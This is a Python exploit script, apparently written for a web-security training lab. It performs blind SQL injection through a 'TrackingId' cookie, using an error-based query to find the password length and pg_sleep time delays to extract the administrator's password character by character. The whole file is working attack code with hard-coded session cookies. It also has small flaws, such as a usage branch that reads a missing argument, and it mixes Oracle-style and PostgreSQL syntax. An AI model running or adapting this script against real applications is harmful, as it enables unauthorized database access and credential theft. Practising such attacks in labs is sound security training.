import requests
import sys
import urllib3
import urllib
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def sqli_password(url, password_length):
	password_extracted=""
	for i in range(1,password_length+1):
		for j in range(32,126):
			sqli_payload = "' || (SELECT CASE WHEN (SUBSTRING(password,%s,1)=CHR(%s)) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users where username='administrator') --" %(i,j)
			sqli_payload_encoded = urllib.parse.quote(sqli_payload)
			cookies = {"TrackingId": "Z5O3KDIkSlzASnKH" + sqli_payload_encoded, "session": "rtQ9HfGdj3XeudQ9pCKtkH7u2kDpzptT"}
			r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
			# print(sqli_payload)
			# print(r.status_code)
			print(r.elapsed.total_seconds())
			if(r.elapsed.total_seconds() > 10):
				password_extracted += chr(j)
				sys.stdout.write('\r' + password_extracted)
				sys.stdout.flush()
				break
			else:
				sys.stdout.write('\r' + password_extracted + chr(j))
				sys.stdout.flush()
		
		
def sql_password_length(url):
	print("Identifying password length")
	for i in range(1,25):
		sqli_payload = "'|| (SELECT CASE WHEN LENGTH(password)=%s THEN TO_CHAR(1/0) ELSE 'a' END FROM users where username = 'administrator')--" % i
		sqli_payload_encoded = urllib.parse.quote(sqli_payload)
		cookies = {"TrackingId": "gOKC4nExJLSk8gCI" + sqli_payload_encoded, "session": "YbmufZW6OrP9jBvgCw1cyTUFKyXz7Fuu"}
		r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
		if r.status_code == 500:
			print("Password length is %s" % i)
			return i
		else:
			sys.stdout.write('\r' + str(i))
			sys.stdout.flush()

def main():
	if len(sys.argv) != 2:
		print("(-) usage %s <url>" % sys.argv[0])
		print("(-) Example: %s www.example.com" % sys.argv[1])

	url = sys.argv[1]
	print("(+) Retrieving administrator password")
	# password_length = sql_password_length(url)
	password_length = 20
	sqli_password(url, password_length)
	
	
if __name__ == "__main__":
	main()